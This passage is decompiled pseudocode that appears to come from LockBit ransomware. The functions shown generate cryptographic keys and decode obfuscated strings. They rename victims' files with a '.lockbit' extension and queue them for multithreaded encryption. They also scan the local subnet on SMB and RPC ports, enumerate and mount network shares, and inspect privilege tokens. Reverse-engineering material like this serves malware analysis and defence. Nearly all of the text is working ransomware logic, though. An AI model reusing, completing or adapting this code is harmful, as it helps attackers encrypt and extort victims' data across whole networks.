  int v13[3]; // [esp+3C0h] [ebp-28h] BYREF
  int v14[3]; // [esp+3CCh] [ebp-1Ch] BYREF
  int v15; // [esp+3D8h] [ebp-10h]
  int *v16; // [esp+3DCh] [ebp-Ch]
  int v17; // [esp+3E0h] [ebp-8h]
  unsigned int v18; // [esp+3E4h] [ebp-4h]

  v15 = 0;
  v16 = a2;
  sub_404760(v14);
  sub_404760(v13);
  sub_406A50(dword_41D220, 0, 0);
  if ( !sub_405360((int)v14, ::Src, 0x100u)
    && !sub_405360((int)v13, &unk_41B100, 3u)
    && !sub_4069A0((int)dword_41D220, (int)v14, 0, 0, 0, (int)v13) )
  {
    sub_401970(v11);
    sub_401610(v10);
    sub_40A5A0(pbBuffer, 0x64u);
    if ( !sub_401B70(v11, (int)sub_4014E0, (int)v10, pbBuffer, 0x64u) )
    {
      v4 = (unsigned __int64)(1121950641i64 * *a2) >> 32;
      v5 = 0;
      v18 = *a2;
      v6 = 245;
      v17 = 0;
      if ( (v4 >> 6) + ((unsigned int)v4 >> 31) + 1 )
      {
        while ( !sub_406A80(
                   dword_41D220,
                   (void (__cdecl *)(int, unsigned int, unsigned int))sub_401990,
                   (int)v11,
                   0,
                   v6,
                   Src,
                   (char *)&Data[v5]) )
        {
          v7 = v18;
          if ( v18 >= 0xF5 )
            v7 = v6;
          v6 = v7;
          v18 -= 245;
          Src += 245;
          v8 = (int)((unsigned __int64)(1121950641i64 * *v16) >> 32) >> 6;
          v5 += 256;
          if ( ++v17 == v8 + (v8 >> 31) + 1 )
            goto LABEL_10;
        }
      }
      else
      {
LABEL_10:
        v15 = 1;
        *v16 = v5;
      }
    }
  }
  sub_404050((int)v14);
  sub_404050((int)v13);
  sub_406620((int)dword_41D220);
  sub_401940(v11);
  sub_4014A0(v10);
  return v15;
}
// 41B000: using guessed type BYTE Src[256];
// 41CA90: using guessed type BYTE Data[1280];
// 41D220: using guessed type int dword_41D220[43];
// 4120A0: using guessed type char var_1D0[320];

//----- (00412270) --------------------------------------------------------
BOOL __thiscall sub_412270(char **this)
{
  BOOL v2; // edi
  int v4[130]; // [esp+8h] [ebp-490h] BYREF
  char v5[320]; // [esp+210h] [ebp-288h] BYREF
  int v6[45]; // [esp+350h] [ebp-148h] BYREF
  BYTE pbBuffer[52]; // [esp+404h] [ebp-94h] BYREF
  int v8[3]; // [esp+438h] [ebp-60h] BYREF
  int v9[3]; // [esp+444h] [ebp-54h] BYREF
  int v10[3]; // [esp+450h] [ebp-48h] BYREF
  int v11[3]; // [esp+45Ch] [ebp-3Ch] BYREF
  int v12[3]; // [esp+468h] [ebp-30h] BYREF
  int v13[3]; // [esp+474h] [ebp-24h] BYREF
  int v14[3]; // [esp+480h] [ebp-18h] BYREF
  int v15[3]; // [esp+48Ch] [ebp-Ch] BYREF

  v2 = 0;
  sub_401970(v5);
  sub_406A50(v6, 0, 0);
  sub_404760(v15);
  sub_404760(v14);
  sub_404760(v13);
  sub_404760(v12);
  sub_404760(v11);
  sub_404760(v10);
  sub_404760(v9);
  sub_404760(v8);
  sub_40A5A0(pbBuffer, 0x32u);
  sub_401610(v4);
  if ( !sub_401B70(v5, (int)sub_4014E0, (int)v4, pbBuffer, 0x32u)
    && !sub_4066C0(v6, (void (__cdecl *)(int, unsigned int, unsigned int))sub_401990, (int)v5, 0x800u, 65537)
    && !sub_406450(v6, (int)v15, (int)v14, (int)v13, (int)v12, (int)v11)
    && !sub_406550(v6, (int)v10, (int)v9, (int)v8)
    && !sub_405870((int)v15, *this, 0x100u)
    && !sub_405870((int)v11, *this + 256, 3u)
    && !sub_405870((int)v12, *this + 259, 0x100u)
    && !sub_405870((int)v14, *this + 515, 0x80u)
    && !sub_405870((int)v13, *this + 643, 0x80u)
    && !sub_405870((int)v10, *this + 771, 0x80u)
    && !sub_405870((int)v9, *this + 899, 0x80u) )
  {
    v2 = sub_405870((int)v8, *this + 1027, 0x80u) == 0;
  }
  sub_404050((int)v15);
  sub_404050((int)v14);
  sub_404050((int)v13);
  sub_404050((int)v12);
  sub_404050((int)v11);
  sub_404050((int)v10);
  sub_404050((int)v9);
  sub_404050((int)v8);
  sub_406620((int)v6);
  sub_401940(v5);
  sub_4014A0(v4);
  return v2;
}
// 412270: using guessed type char var_288[320];
// 412270: using guessed type int var_148[45];

//----- (00412730) --------------------------------------------------------
int sub_412730()
{
  int v5; // ecx
  int v6; // eax
  unsigned int v12; // ecx
  int v18; // ecx
  int v19; // eax
  unsigned int v25; // ecx
  HANDLE IoCompletionPort; // eax
  unsigned int v27; // ecx
  HANDLE (__stdcall *v28)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD); // esi
  HANDLE v29; // ebx
  HANDLE v30; // edi
  DWORD v32; // [esp+10h] [ebp-58h]
  DWORD ThreadId; // [esp+14h] [ebp-54h] BYREF
  CHAR v34[16]; // [esp+18h] [ebp-50h] BYREF
  _DWORD v35[3]; // [esp+28h] [ebp-40h] BYREF
  SYSTEMTIME SystemTime; // [esp+34h] [ebp-34h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+44h] [ebp-24h] BYREF

  _EAX = 0;
  __asm { cpuid }
  *(_DWORD *)v34 = _EAX;
  *(_DWORD *)&v34[4] = _EBX;
  *(_DWORD *)&v34[8] = _ECX;
  *(_DWORD *)&v34[12] = _EDX;
  if ( _EAX >= 1 )
  {
    v5 = 1;
    v6 = 1;
    if ( *(_DWORD *)&v34[4] != 1970169159 || *(_DWORD *)&v34[12] != 1231384169 || *(_DWORD *)&v34[8] != 1818588270 )
      v5 = 0;
    if ( *(_DWORD *)&v34[4] != 1752462657 || *(_DWORD *)&v34[12] != 1769238117 || *(_DWORD *)&v34[8] != 1145913699 )
      v6 = 0;
    if ( v5 || v6 )
    {
      _EAX = 1;
      __asm { cpuid }
      *(_DWORD *)v34 = _EAX;
      *(_DWORD *)&v34[4] = _EBX;
      *(_DWORD *)&v34[8] = _ECX;
      *(_DWORD *)&v34[12] = _EDX;
      if ( (_ECX & 0x2000000) != 0 )
      {
        v12 = 0;
        *(_OWORD *)v34 = xmmword_4194D0;
        v35[0] = 1565677852;
        strcpy((char *)&v35[1], "^PYX");
        do
          v34[++v12] ^= v34[0];
        while ( v12 < 0x17 );
        LOBYTE(v35[2]) = 0;
        sub_4100C0(&v34[1]);
        dword_41D32C = 1;
      }
    }
  }
  _EAX = 0;
  __asm { cpuid }
  *(_DWORD *)v34 = _EAX;
  *(_DWORD *)&v34[4] = _EBX;
  *(_DWORD *)&v34[8] = _ECX;
  v18 = 1;
  *(_DWORD *)&v34[12] = _EDX;
  v19 = 1;
  if ( _EBX != 1970169159 || *(_DWORD *)&v34[12] != 1231384169 || *(_DWORD *)&v34[8] != 1818588270 )
    v18 = 0;
  if ( *(_DWORD *)&v34[4] != 1752462657 || *(_DWORD *)&v34[12] != 1769238117 || *(_DWORD *)&v34[8] != 1145913699 )
    v19 = 0;
  if ( v18 || v19 )
  {
    _EAX = 1;
    __asm { cpuid }
    *(_DWORD *)v34 = _EAX;
    *(_DWORD *)&v34[4] = _EBX;
    *(_DWORD *)&v34[8] = _ECX;
    *(_DWORD *)&v34[12] = _EDX;
    if ( (_ECX & 0x40000000) != 0 )
    {
      v25 = 0;
      *(_OWORD *)v34 = xmmword_419400;
      strcpy((char *)v35, "`%.!\",%$");
      do
        v34[++v25] ^= v34[0];
      while ( v25 < 0x17 );
      LOBYTE(v35[2]) = 0;
      sub_4100C0(&v34[1]);
      dword_41D334 = 1;
    }
  }
  sub_411790();
  GetSystemInfo(&SystemInfo);
  NumberOfConcurrentThreads = 2 * SystemInfo.dwNumberOfProcessors;
  IoCompletionPort = CreateIoCompletionPort((HANDLE)0xFFFFFFFF, 0, 0, 2 * SystemInfo.dwNumberOfProcessors);
  v27 = 0;
  ExistingCompletionPort = IoCompletionPort;
  *(_OWORD *)v34 = xmmword_419720;
  strcpy((char *)v35, "GPTQF\x1B\x1B\x1B");
  do
    v34[++v27] ^= v34[0];
  while ( v27 < 0x17 );
  LOBYTE(v35[2]) = 0;
  sub_4100C0(&v34[1]);
  v32 = 0;
  if ( SystemInfo.dwNumberOfProcessors )
  {
    v28 = CreateThread;
    do
    {
      v29 = v28(0, 0, (LPTHREAD_START_ROUTINE)sub_410E30, 0, 0, &ThreadId);
      v30 = v28(0, 0, (LPTHREAD_START_ROUTINE)sub_410E30, 0, 0, &ThreadId);
      SetThreadAffinityMask(v29, 1 << v32);
      SetThreadAffinityMask(v30, 1 << v32);
      v28 = CreateThread;
      ++v32;
    }
    while ( v32 < SystemInfo.dwNumberOfProcessors );
  }
  *(_DWORD *)&SystemTime.wYear = 67536;
  *(_DWORD *)&SystemTime.wDay = 65537;
  *(_DWORD *)&SystemTime.wMinute = 65537;
  SystemTime.wDayOfWeek = 1;
  SystemTime.wMilliseconds = 1;
  SystemTimeToFileTime(&SystemTime, &FileTime);
  return 1;
}
// 419400: using guessed type __int128 xmmword_419400;
// 4194D0: using guessed type __int128 xmmword_4194D0;
// 419720: using guessed type __int128 xmmword_419720;
// 41D32C: using guessed type int dword_41D32C;
// 41D334: using guessed type int dword_41D334;

//----- (00412A40) --------------------------------------------------------
LPCWSTR __thiscall sub_412A40(LPCWSTR pszPath)
{
  const WCHAR *ExtensionW; // edi
  int v2; // ebx
  int i; // esi
  const WCHAR *v4; // eax
  WCHAR *v5; // edi
  DWORD (__stdcall *v6)(); // ebx
  int j; // esi
  WCHAR *FileW; // eax
  WCHAR *v9; // ebx
  union _LARGE_INTEGER *v11; // eax
  union _LARGE_INTEGER *v12; // ebx
  WCHAR *v13; // esi
  LONG HighPart; // ecx
  DWORD LowPart; // eax
  WCHAR NewFileName[264]; // [esp+10h] [ebp-428h] BYREF
  LPCWSTR lpString1[30]; // [esp+220h] [ebp-218h]
  int v18[6]; // [esp+298h] [ebp-1A0h] BYREF
  int v19[5]; // [esp+2B0h] [ebp-188h] BYREF
  WCHAR String2[10]; // [esp+2C4h] [ebp-174h] BYREF
  int v21[4]; // [esp+2D8h] [ebp-160h] BYREF
  __int16 v22; // [esp+2E8h] [ebp-150h]
  int v23[4]; // [esp+2ECh] [ebp-14Ch] BYREF
  int v24[4]; // [esp+2FCh] [ebp-13Ch] BYREF
  int v25[4]; // [esp+30Ch] [ebp-12Ch] BYREF
  int v26[4]; // [esp+31Ch] [ebp-11Ch] BYREF
  int v27[2]; // [esp+32Ch] [ebp-10Ch] BYREF
  __int16 v28; // [esp+334h] [ebp-104h]
  int v29[2]; // [esp+338h] [ebp-100h] BYREF
  __int16 v30; // [esp+340h] [ebp-F8h]
  int v31[2]; // [esp+344h] [ebp-F4h] BYREF
  __int16 v32; // [esp+34Ch] [ebp-ECh]
  int v33[2]; // [esp+350h] [ebp-E8h] BYREF
  __int16 v34; // [esp+358h] [ebp-E0h]
  int v35[2]; // [esp+35Ch] [ebp-DCh] BYREF
  __int16 v36; // [esp+364h] [ebp-D4h]
  int v37[2]; // [esp+368h] [ebp-D0h] BYREF
  __int16 v38; // [esp+370h] [ebp-C8h]
  int v39[2]; // [esp+374h] [ebp-C4h] BYREF
  __int16 v40; // [esp+37Ch] [ebp-BCh]
  int v41[2]; // [esp+380h] [ebp-B8h] BYREF
  __int16 v42; // [esp+388h] [ebp-B0h]
  int v43[2]; // [esp+38Ch] [ebp-ACh] BYREF
  __int16 v44; // [esp+394h] [ebp-A4h]
  int v45[2]; // [esp+398h] [ebp-A0h] BYREF
  __int16 v46; // [esp+3A0h] [ebp-98h]
  int v47[2]; // [esp+3A4h] [ebp-94h] BYREF
  __int16 v48; // [esp+3ACh] [ebp-8Ch]
  int v49[2]; // [esp+3B0h] [ebp-88h] BYREF
  __int16 v50; // [esp+3B8h] [ebp-80h]
  int v51[2]; // [esp+3BCh] [ebp-7Ch] BYREF
  __int16 v52; // [esp+3C4h] [ebp-74h]
  int v53[2]; // [esp+3C8h] [ebp-70h] BYREF
  __int16 v54; // [esp+3D0h] [ebp-68h]
  int v55[2]; // [esp+3D4h] [ebp-64h] BYREF
  __int16 v56; // [esp+3DCh] [ebp-5Ch]
  int v57[2]; // [esp+3E0h] [ebp-58h] BYREF
  __int16 v58; // [esp+3E8h] [ebp-50h]
  int v59[2]; // [esp+3ECh] [ebp-4Ch] BYREF
  __int16 v60; // [esp+3F4h] [ebp-44h]
  int v61[2]; // [esp+3F8h] [ebp-40h] BYREF
  __int16 v62; // [esp+400h] [ebp-38h]
  int v63[2]; // [esp+404h] [ebp-34h] BYREF
  __int16 v64; // [esp+40Ch] [ebp-2Ch]
  int v65[2]; // [esp+410h] [ebp-28h] BYREF
  __int16 v66; // [esp+418h] [ebp-20h]
  int v67[2]; // [esp+41Ch] [ebp-1Ch] BYREF
  int v68[2]; // [esp+424h] [ebp-14h] BYREF
  int v69; // [esp+42Ch] [ebp-Ch]
  LPCWSTR File; // [esp+430h] [ebp-8h]
  LPCWSTR lpExistingFileName; // [esp+434h] [ebp-4h]

  v65[0] = 7471150;
  v65[1] = 7471201;
  lpExistingFileName = pszPath;
  v66 = 0;
  v63[0] = 7995438;
  v63[1] = 7340137;
  v64 = 0;
  v68[0] = 3604526;
  v68[1] = 122;
  v61[0] = 6488110;
  v61[1] = 7340139;
  v62 = 0;
  v26[0] = 6553646;
  v26[1] = 6488161;
  v26[2] = 6357104;
  v26[3] = 99;
  v67[0] = 6553646;
  v67[1] = 98;
  v25[0] = 6553646;
  v25[1] = 2949218;
  v25[2] = 6815859;
  v25[3] = 109;
  v24[0] = 6553646;
  v24[1] = 2949218;
  v24[2] = 6357111;
  v24[3] = 108;
  v59[0] = 6553646;
  v59[1] = 3342434;
  v60 = 0;
  v57[0] = 6553646;
  v57[1] = 6684770;
  v58 = 0;
  v55[0] = 6553646;
  v55[1] = 6488162;
  v56 = 0;
  v53[0] = 6553646;
  v53[1] = 7536738;
  v54 = 0;
  v51[0] = 6553646;
  v51[1] = 7602274;
  v52 = 0;
  v49[0] = 6553646;
  v49[1] = 7733346;
  v50 = 0;
  v47[0] = 6684718;
  v47[1] = 7143538;
  v48 = 0;
  v45[0] = 7143470;
  v45[1] = 6684772;
  v46 = 0;
  v43[0] = 7143470;
  v43[1] = 6750322;
  v44 = 0;
  v41[0] = 7143470;
  v41[1] = 6422647;
  v42 = 0;
  v39[0] = 7143470;
  v39[1] = 6553721;
  v40 = 0;
  v37[0] = 7209006;
  v37[1] = 6684772;
  v38 = 0;
  v35[0] = 7405614;
  v35[1] = 7929970;
  v36 = 0;
  v33[0] = 7536686;
  v33[1] = 6422628;
  v34 = 0;
  v31[0] = 7536686;
  v31[1] = 6684772;
  v32 = 0;
  v29[0] = 7536686;
  v29[1] = 7078001;
  v30 = 0;
  v23[0] = 7536686;
  v23[1] = 7078001;
  v22 = 0;
  v28 = 0;
  lpString1[0] = (LPCWSTR)v65;
  lpString1[1] = (LPCWSTR)v63;
  lpString1[2] = (LPCWSTR)v68;
  lpString1[3] = (LPCWSTR)v61;
  lpString1[4] = (LPCWSTR)v26;
  lpString1[5] = (LPCWSTR)v67;
  lpString1[6] = (LPCWSTR)v25;
  lpString1[7] = (LPCWSTR)v24;
  lpString1[8] = (LPCWSTR)v59;
  lpString1[9] = (LPCWSTR)v57;
  lpString1[10] = (LPCWSTR)v55;
  lpString1[11] = (LPCWSTR)v53;
  lpString1[12] = (LPCWSTR)v51;
  lpString1[13] = (LPCWSTR)v49;
  lpString1[14] = (LPCWSTR)v47;
  lpString1[15] = (LPCWSTR)v45;
  lpString1[16] = (LPCWSTR)v43;
  lpString1[17] = (LPCWSTR)v41;
  lpString1[18] = (LPCWSTR)v39;
  lpString1[19] = (LPCWSTR)v37;
  lpString1[20] = (LPCWSTR)v35;
  lpString1[21] = (LPCWSTR)v33;
  lpString1[22] = (LPCWSTR)v31;
  lpString1[23] = (LPCWSTR)v29;
  lpString1[24] = (LPCWSTR)v23;
  lpString1[25] = (LPCWSTR)v21;
  lpString1[26] = (LPCWSTR)v19;
  v23[2] = 7602281;
  v23[3] = 101;
  v21[0] = 7536686;
  v21[1] = 7078001;
  v21[2] = 7602281;
  v21[3] = 3342437;
  v19[0] = 7536686;
  v19[1] = 7078001;
  v19[2] = 7602281;
  v19[3] = 6553701;
  v19[4] = 98;
  v27[0] = 7602222;
  v27[1] = 6553709;
  lpString1[27] = (LPCWSTR)v27;
  lpString1[28] = 0;
  ExtensionW = PathFindExtensionW(pszPath);
  v2 = 0;
  File = ExtensionW;
  for ( i = 0; i < 255; ++i )
  {
    v4 = lpString1[i];
    if ( !v4 )
      break;
    if ( !lstrcmpiW(v4, ExtensionW) )
      v2 = 1;
  }
  v5 = (WCHAR *)lpExistingFileName;
  v69 = v2;
  wcscpy((wchar_t *)v18, L"%s.lockbit");
  wcscpy(String2, L".lockbit");
  wsprintfW(NewFileName, (LPCWSTR)v18, lpExistingFileName);
  v6 = GetLastError;
  for ( j = 0; ; ++j )
  {
    if ( lstrcmpiW(File, String2) && !MoveFileW(v5, NewFileName) )
      goto LABEL_9;
    FileW = (WCHAR *)CreateFileW(NewFileName, 0xC0000000, 0, 0, 3u, 0x50000000u, 0);
    v9 = FileW;
    lpExistingFileName = FileW;
    if ( FileW != (WCHAR *)-1 )
      break;
    v6 = GetLastError;
LABEL_9:
    if ( v6() != 5 || sub_410610(v5) != 1 && !sub_40A410(v5) || j >= 2 )
      return 0;
  }
  ExistingCompletionPort = CreateIoCompletionPort(FileW, ExistingCompletionPort, 0, NumberOfConcurrentThreads);
  if ( ExistingCompletionPort == (HANDLE)-1 )
  {
    CloseHandle(v9);
    return 0;
  }
  v11 = (union _LARGE_INTEGER *)malloc(0x40068u);
  v12 = v11;
  if ( v11 )
  {
    v13 = (WCHAR *)lpExistingFileName;
    v11[6].LowPart = v69;
    v11[5].LowPart = 0;
    v11[5].HighPart = 0;
    if ( GetFileSizeEx(v13, v11 + 3)
      && (HighPart = v12[3].HighPart, LowPart = v12[3].LowPart, __SPAIR64__(HighPart, LowPart) >= 16) )
    {
      v12[4].HighPart = 4;
      v12[1].LowPart = LowPart - 16;
      v12[3].LowPart = v12[3].LowPart;
      v12[3].HighPart = v12[3].HighPart;
      v12[1].HighPart = (__PAIR64__(HighPart, LowPart) - 16) >> 32;
      v12[2].LowPart = 0;
      v12[4].LowPart = (DWORD)v13;
      sub_40A5A0((BYTE *)&v12[32774].QuadPart + 4, 0x10u);
      sub_40A5A0((BYTE *)&v12[32776].QuadPart + 4, 0x10u);
      File = (LPCWSTR)ReadFile((HANDLE)v12[4].LowPart, (char *)&v12[6].QuadPart + 4, 0x10u, 0, (LPOVERLAPPED)v12);
      if ( File || GetLastError() == 997 )
      {
        _InterlockedIncrement((volatile signed __int32 *)arglist);
        sub_410CE0(v5);
        if ( _InterlockedIncrement(&dword_41D330) > 400 )
        {
          do
            Sleep(1u);
          while ( dword_41D330 >= 50 );
        }
        return (LPCWSTR)1;
      }
      else
      {
        free((char *)&v12[6].QuadPart + 4);
        free(v12);
        CloseHandle((HANDLE)lpExistingFileName);
        return File;
      }
    }
    else
    {
      free(v12);
      CloseHandle(v13);
      return 0;
    }
  }
  else
  {
    CloseHandle((HANDLE)lpExistingFileName);
    return 0;
  }
}
// 41D330: using guessed type int dword_41D330;

//----- (00413140) --------------------------------------------------------
void __stdcall __noreturn sub_413140(PVOID Parameter)
{
  PSLIST_ENTRY v1; // eax
  WCHAR *v2; // esi
  WCHAR v3[4]; // [esp+8h] [ebp-28h] BYREF
  char cp[16]; // [esp+10h] [ebp-20h] BYREF
  struct _SINGLE_LIST_ENTRY *Next; // [esp+20h] [ebp-10h]
  __int16 v6; // [esp+24h] [ebp-Ch]

  _InterlockedIncrement(&dword_41D338);
  while ( 1 )
  {
    EnterCriticalSection(&stru_41D2D4);
    do
    {
      if ( dword_41D33C <= 0 )
      {
        LeaveCriticalSection(&stru_41D2D4);
        _InterlockedDecrement(&dword_41D338);
        ExitThread(0);
      }
      --dword_41D33C;
      v1 = InterlockedPopEntrySList(Block);
    }
    while ( !v1 );
    *(_OWORD *)cp = *(_OWORD *)&v1[1].Next;
    Next = v1[5].Next;
    v6 = (__int16)v1[6].Next;
    free(v1);
    LeaveCriticalSection(&stru_41D2D4);
    if ( sub_413790(cp, 0x1BDu) || sub_413790(cp, 0x87u) )
    {
      v2 = (WCHAR *)malloc(0x3Cu);
      wcscpy(v3, L"%S");
      wsprintfW(v2, v3, cp);
      sub_413240(v2);
    }
  }
}
// 41D338: using guessed type int dword_41D338;
// 41D33C: using guessed type int dword_41D33C;

//----- (00413240) --------------------------------------------------------
int __thiscall sub_413240(WCHAR *this)
{
  HMODULE ModuleHandleA; // eax
  FARPROC ProcAddress; // edi
  char v4; // cl
  int v5; // eax
  HMODULE v6; // eax
  FARPROC v7; // eax
  int (__stdcall *v8)(int *, int, int); // esi
  _DWORD *v9; // esi
  DWORD v10; // eax
  DWORD v11; // esi
  DWORD v12; // eax
  LPBYTE v13; // ecx
  BOOL v14; // esi
  WCHAR Parameter[520]; // [esp+10h] [ebp-808h] BYREF
  WCHAR v17[260]; // [esp+420h] [ebp-3F8h] BYREF
  WCHAR servername[128]; // [esp+628h] [ebp-1F0h] BYREF
  CHAR v19[64]; // [esp+728h] [ebp-F0h] BYREF
  char v20[8]; // [esp+768h] [ebp-B0h] BYREF
  int v21; // [esp+770h] [ebp-A8h]
  int v22; // [esp+774h] [ebp-A4h]
  struct _NETRESOURCEW NetResource; // [esp+7A4h] [ebp-74h] BYREF
  LPBYTE bufptr; // [esp+7C4h] [ebp-54h] BYREF
  DWORD totalentries; // [esp+7C8h] [ebp-50h] BYREF
  DWORD resume_handle; // [esp+7CCh] [ebp-4Ch] BYREF
  WCHAR v27[4]; // [esp+7D0h] [ebp-48h] BYREF
  int v28; // [esp+7D8h] [ebp-40h]
  DWORD entriesread; // [esp+7DCh] [ebp-3Ch] BYREF
  int v30; // [esp+7E0h] [ebp-38h] BYREF
  void *TokenHandle; // [esp+7E4h] [ebp-34h] BYREF
  HANDLE TokenInformation; // [esp+7E8h] [ebp-30h] BYREF
  char v33[20]; // [esp+7EDh] [ebp-2Bh] BYREF
  char v34[11]; // [esp+801h] [ebp-17h] BYREF
  DWORD v35[2]; // [esp+80Ch] [ebp-Ch] BYREF
  char v36; // [esp+817h] [ebp-1h]

  v30 = 0;
  strcpy(&v33[15], "%S");
  wcscpy(v27, L"%S");
  memset(&servername[1], 0, 0xFEu);
  servername[0] = *this;
  wsprintfA(v19, &v33[15], this);
  strcpy(v34, "ninet_addr");
  strcpy((char *)v35, "\nWS2_32");
  v36 = 28;
  ModuleHandleA = GetModuleHandleA((LPCSTR)v35 + 1);
  ProcAddress = GetProcAddress(ModuleHandleA, &v34[1]);
  strcpy(v33, "N)+:&!=:,7/**<");
  v4 = 78;
  v5 = 0;
  while ( 1 )
  {
    v33[v5 + 1] ^= v4;
    if ( (unsigned int)++v5 >= 0xD )
      break;
    v4 = v33[0];
  }
  v33[14] = 0;
  v6 = GetModuleHandleA((LPCSTR)v35 + 1);
  v7 = GetProcAddress(v6, &v33[1]);
  v8 = (int (__stdcall *)(int *, int, int))v7;
  if ( ProcAddress )
  {
    if ( v7 )
    {
      v30 = ((int (__stdcall *)(CHAR *))ProcAddress)(v19);
      if ( v30 != -1 )
      {
        v9 = (_DWORD *)v8(&v30, 4, 2);
        if ( v9 )
        {
          memset(servername, 0, sizeof(servername));
          wsprintfW(servername, v27, *v9);
        }
      }
    }
  }
  v28 = 0;
  while ( 1 )
  {
    entriesread = 0;
    totalentries = 0;
    resume_handle = 0;
    wsprintfW(v17, L"\\\\%S", servername);
    NetResource.dwType = 0;
    NetResource.lpLocalName = 0;
    NetResource.lpRemoteName = v17;
    NetResource.lpProvider = 0;
    WNetAddConnection2W(&NetResource, 0, 0, 0);
    do
    {
      v10 = NetShareEnum(servername, 1u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries, &resume_handle);
      v11 = v10;
      if ( v10 && v10 != 234 )
        break;
      v12 = 1;
      v13 = bufptr;
      if ( entriesread )
      {
        do
        {
          if ( !*((_DWORD *)v13 + 1) )
          {
            wsprintfW(Parameter, L"\\\\%s\\%s", servername, *(_DWORD *)v13);
            sub_4090E0(Parameter);
          }
          ++v12;
          v13 += 12;
        }
        while ( v12 <= entriesread );
      }
      NetApiBufferFree(bufptr);
    }
    while ( v11 == 234 );
    if ( v11 != 5 )
      break;
    if ( v28 )
      break;
    v28 = 1;
    if ( !OpenProcessToken((HANDLE)0xFFFFFFFF, 8u, &TokenHandle) )
      break;
    if ( GetTokenInformation(TokenHandle, TokenElevationType, &TokenInformation, 4u, &v35[1]) )
    {
      if ( TokenInformation == HANDLE_FLAG_PROTECT_FROM_CLOSE )
      {
        if ( GetTokenInformation(TokenHandle, TokenLinkedToken, &TokenInformation, 4u, &v35[1]) )
        {
          v14 = GetTokenInformation(TokenInformation, TokenStatistics, v20, 0x38u, &v35[1]);
          CloseHandle(TokenInformation);
          if ( v14 )
          {
            if ( sub_408940(v21, v22) )
              continue;
          }
        }
      }
    }
    CloseHandle(TokenHandle);
    return 1;
  }
  return 1;
}
// 413240: using guessed type HANDLE TokenInformation;
// 413240: using guessed type char var_B0[8];

//----- (00413590) --------------------------------------------------------
void sub_413590()
{
  struct _IP_ADAPTER_INFO *v0; // edi
  int v1; // esi
  const CHAR *v2; // esi
  unsigned int v3; // eax
  int i; // edi
  CHAR *v5; // esi
  CHAR pszPath[16]; // [esp+10h] [ebp-50h] BYREF
  CHAR v7[16]; // [esp+28h] [ebp-38h] BYREF
  int v8; // [esp+38h] [ebp-28h]
  __int16 v9; // [esp+3Ch] [ebp-24h]
  char v10; // [esp+40h] [ebp-20h]
  CHAR String2[8]; // [esp+41h] [ebp-1Fh] BYREF
  char v12[7]; // [esp+49h] [ebp-17h] BYREF
  struct _IP_ADAPTER_INFO *v13; // [esp+50h] [ebp-10h]
  LPCSTR lpString1; // [esp+54h] [ebp-Ch]
  ULONG SizePointer; // [esp+58h] [ebp-8h] BYREF
  struct _IP_ADAPTER_INFO *v16; // [esp+5Ch] [ebp-4h]

  SizePointer = 648;
  v0 = (struct _IP_ADAPTER_INFO *)malloc(0x288u);
  v13 = v0;
  if ( v0 )
  {
    if ( GetAdaptersInfo(v0, &SizePointer) != 111
      || (free(v0), v0 = (struct _IP_ADAPTER_INFO *)malloc(SizePointer), (v13 = v0) != 0) )
    {
      if ( !GetAdaptersInfo(v0, &SizePointer) )
      {
        v1 = (int)v0;
        v16 = v0;
        do
        {
          if ( *(_DWORD *)(v1 + 416) != 24 )
          {
            v10 = 27;
            strcpy(String2, "0.0.0.0");
            lpString1 = (LPCSTR)(v1 + 432);
            if ( lstrcmpiA((LPCSTR)(v1 + 432), String2) )
            {
              v2 = lpString1;
              *(_OWORD *)pszPath = *(_OWORD *)lpString1;
              PathRemoveExtensionA(pszPath);
              v3 = 0;
              *(_OWORD *)v7 = xmmword_419550;
              v8 = 252841235;
              v9 = 9;
              do
                v7[++v3] ^= v7[0];
              while ( v3 < 0x14 );
              HIBYTE(v9) = 0;
              sub_4100C0(&v7[1], pszPath);
              for ( i = 0; i < 255; ++i )
              {
                strcpy(v12, "5%s.%d");
                wsprintfA(v7, &v12[1], pszPath, i);
                if ( lstrcmpiA(v2, v7) )
                {
                  v5 = (CHAR *)malloc(0x1Cu);
                  lstrcpyA(v5 + 4, v7);
                  InterlockedPushEntrySList(Block, (PSLIST_ENTRY)v5);
                  ++dword_41D33C;
                  v2 = lpString1;
                }
              }
              v1 = (int)v16;
            }
          }
          v1 = *(_DWORD *)v1;
          v16 = (struct _IP_ADAPTER_INFO *)v1;
        }
        while ( v1 );
        v0 = v13;
      }
      if ( v0 )
        free(v0);
    }
  }
}
// 413604: conditional instruction was optimized away because edi.4!=0
// 419550: using guessed type __int128 xmmword_419550;
// 41D33C: using guessed type int dword_41D33C;

//----- (00413790) --------------------------------------------------------
char __fastcall sub_413790(char *cp, u_short hostshort)
{
  SOCKET v3; // esi
  fd_set writefds; // [esp+8h] [ebp-230h] BYREF
  fd_set exceptfds; // [esp+110h] [ebp-128h] BYREF
  struct sockaddr name; // [esp+21Ch] [ebp-1Ch] BYREF
  struct timeval timeout; // [esp+22Ch] [ebp-Ch] BYREF
  u_long argp; // [esp+234h] [ebp-4h] BYREF

  *(_QWORD *)&name.sa_data[6] = 0i64;
  name.sa_family = 2;
  *(_DWORD *)&name.sa_data[2] = inet_addr(cp);
  *(_WORD *)name.sa_data = htons(hostshort);
  if ( *(_DWORD *)&name.sa_data[2] == -1 )
    return 0;
  v3 = socket(2, 1, 6);
  if ( v3 == -1 )
    return 0;
  argp = 1;
  if ( ioctlsocket(v3, -2147195266, &argp) == -1 )
    goto LABEL_4;
  if ( connect(v3, &name, 16) == -1 )
  {
    if ( WSAGetLastError() != 10035
      || (writefds.fd_array[0] = v3,
          writefds.fd_count = 1,
          exceptfds.fd_array[0] = v3,
          exceptfds.fd_count = 1,
          timeout.tv_sec = 10,
          timeout.tv_usec = 0,
          select(0, 0, &writefds, &exceptfds, &timeout) <= 0) )
    {
LABEL_4:
      closesocket(v3);
      return 0;
    }
    if ( _WSAFDIsSet(v3, &exceptfds) )
      return 0;
  }
  closesocket(v3);
  return 1;
}

//----- (004138A0) --------------------------------------------------------
ULONG __stdcall sub_4138A0(PVOID Parameter)
{
  union _SLIST_HEADER *v1; // eax
  unsigned int i; // esi
  DWORD ThreadId; // [esp+Ch] [ebp-594h] BYREF
  struct WSAData WSAData; // [esp+10h] [ebp-590h] BYREF

  if ( !WSAStartup(0x202u, &WSAData) )
  {
    v1 = (union _SLIST_HEADER *)malloc(8u);
    Block = v1;
    if ( v1 )
    {
      InitializeSListHead(v1);
